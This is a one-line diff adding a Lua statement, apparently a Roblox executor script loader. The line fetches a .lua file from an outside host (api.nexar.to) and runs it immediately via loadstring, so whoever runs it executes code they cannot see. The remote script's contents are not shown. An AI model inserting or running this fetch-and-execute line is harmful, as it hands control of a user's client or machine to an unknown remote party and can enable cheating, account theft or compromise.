@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api.nexar.to/scripts/v1/-WZBbgKVleka026X2zPenrH6AzcQ76fo.lua"))()
